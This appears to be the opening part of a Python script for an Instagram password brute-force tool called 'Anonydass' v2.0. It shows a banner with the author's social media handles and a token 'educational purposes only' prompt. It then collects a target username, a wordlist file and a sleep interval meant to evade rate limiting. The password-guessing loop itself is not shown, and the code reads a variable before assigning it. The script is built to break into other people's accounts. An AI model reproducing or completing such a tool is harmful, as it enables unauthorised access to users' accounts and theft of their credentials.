import os
import instaloader
from getpass import getpass
import time
import subprocess as sub
import random
class bcolors:
    BOLD = '\033[1m'
    PURPLE = '\033[95m'
    OKBLUE = '\033[96m'
    OKDARK = "\033[37m"
    OKGREEN = '\033[32m'
    OKYELLOW= '\033[93m'
    OKDIM= '\033[1m'
    OKRED= '\033[31m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[96m'
    UNDERLINE = '\033[4m'
def start():
    print(bcolors.OKGREEN+'''
                                   
  /\  ._   _  ._      _|  _.  _  _ 
 /--\ | | (_) | | \/ (_| (_| _> _> 
                  /                         
Version: 2.0                                                           
    '''
    +bcolors.ENDC)
    print(bcolors.PURPLE+" Youtube: Anonydass2.0 "+bcolors.ENDC)
    print(bcolors.OKDARK+" Instagram: Anonydass "+bcolors.ENDC)
    print(bcolors.OKBLUE+" Telegram: Anonydass2.0 "+bcolors.ENDC)
    print(bcolors.OKYELLOW+" Facebook: tlearndcode "+bcolors.ENDC)
    print(bcolors.OKRED+" GitHub: Anonydass \n"+bcolors.ENDC)
    print(bcolors.BOLD+"\n\n Dont Forget To Subscribe And Follow Telegram\n=======================================================================\n"+bcolors.OKDIM)
    sceltadisc = input("\n\nUse This Content For Educational Purposes Only? [yes/no]: ")
    if sceltadisc == "yes":
        print("\n")
        os.system("clear")
    else:
        exit()

def acquisizione():
    while True:
        if veri_break == "si":
            break
        USER = ""
        USER = input('\nEnter Instagram Username to bruteforce: ')
        wl = input("\nEnter world list name: ")
        sleepp = int(input("\nInsert sleep time for login [Raccomanded 900(15min)]: "))
        while True:
            sub.call("clear")
            procedere = input("Username to bruteforce = "+USER+"\n\nWordlist = "+wl+"\n\nSleep time = "+str(sleepp)+bcolors.WARNING+"\n\nProoceding? [y/break/modify]: "+bcolors.ENDC)
            if procedere == "y":
                veri_break = "si"
                break
            elif procedere == "modify":
                print("\nReturn...")
                break
            elif procedere == "break":
                exit()
            else:
                pass
